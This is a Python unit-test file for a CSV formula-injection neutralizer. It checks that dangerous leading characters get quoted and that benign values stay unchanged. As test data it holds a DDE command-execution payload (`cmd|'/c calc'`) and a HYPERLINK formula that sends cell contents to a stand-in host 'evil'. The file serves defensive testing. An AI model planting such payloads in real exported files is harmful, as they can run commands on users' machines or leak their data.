"""Unit tests for the CSV formula-injection neutralizer (SEC-008)."""

from __future__ import annotations

import pytest

from app.services._csv_safe import csv_safe


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_dangerous_prefix_gets_leading_quote(prefix: str):
    assert csv_safe(f"{prefix}cmd|'/c calc'!A1") == f"'{prefix}cmd|'/c calc'!A1"


def test_leading_whitespace_then_formula_is_neutralized():
    # Some spreadsheet apps strip leading spaces before evaluating, so a value
    # that is only a formula after whitespace must still be quoted.
    assert csv_safe("   =1+1") == "'   =1+1"


@pytest.mark.parametrize(
    "benign",
    [
        "",
        "Jan Kowalski",
        "ul. Łąkowa 1",
        "WD-1",
        "stripe",
        "Fragile, handle with care",
        "100.00",
        "a=b",  # '=' not in the lead position → safe
    ],
)
def test_benign_values_unchanged(benign: str):
    assert csv_safe(benign) == benign


def test_hyperlink_exfil_payload_neutralized():
    payload = '=HYPERLINK("http://evil/?"&A1,"click")'
    assert csv_safe(payload) == "'" + payload
